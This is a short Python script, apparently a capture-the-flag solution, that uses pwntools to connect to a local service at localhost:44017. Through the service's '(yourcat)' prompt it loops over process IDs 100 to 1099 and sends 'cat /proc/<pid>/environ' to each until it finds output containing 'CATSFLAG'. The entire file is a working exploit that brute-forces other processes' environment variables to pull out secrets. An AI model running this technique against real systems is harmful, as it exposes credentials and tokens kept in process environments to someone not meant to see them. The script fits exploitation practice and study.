import pwn

r = pwn.connect("localhost", 44017)

r.recvuntil(b"(yourcat)")
for i in range(100, 1100):
    print(f"trying pid {i}")
    r.sendline(f"cat /proc/{i}/environ")
    recv = r.recvuntil("(yourcat)").decode()
    if "CATSFLAG" in recv:
        print(recv)
        break
r.close()
